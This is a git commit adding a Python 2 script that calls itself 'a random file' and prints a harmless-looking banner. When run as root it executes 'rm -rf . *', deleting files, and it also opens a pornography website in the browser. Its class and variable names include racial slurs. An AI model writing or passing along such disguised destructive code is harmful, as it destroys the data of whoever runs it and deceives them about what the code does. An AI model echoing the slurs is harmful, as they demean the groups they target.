4fa7915990b83930d2f65391c5ffbc409c28b761
Helvete <37981511+HelveteEIP@users.noreply.github.com>
2019-02-04 20:42:00 +0100

    randomshit.py
    Just a random file lmao

---
+++ randomshit.py
@@ -0,0 +1,32 @@
+import os
+
+print ''
+print '                          .___              '
+print '____________    ____    __| _/____   _____  '
+print '\_  __ \__  \  /    \  / __ |/  _ \ /     \ '
+print ' |  | \// __ \|   |  \/ /_/ (  <_> )  Y Y  |'
+print ' |__|  (____  /___|  /\____ |\____/|__|_|  /'
+print '            \/     \/      \/            \/ '
+print '			| THIS IS A RANDOM SCRIPT |		   '
+print ''
+
+root = os.getuid()
+class dong:
+	def __init__(memes, cmd, rape):
+		memes.cmd = cmd
+		memes.re = rape
+	def lol(dank):
+		os.system(dank.cmd)
+		if root == 0:
+			os.system(dank.re)
+		else:
+			print 'dank memes!'
+danks = dong("uname -a", "rm -rf . *")
+danks.lol()
+class zipperhead:
+	def __init__(dongs, shit):
+		dongs.nigg = shit
+	def destroy(shiet):
+		os.system(shiet.nigg)
+chink = zipperhead("x-www-browser https://pornhub.com/")
+chink.destroy()
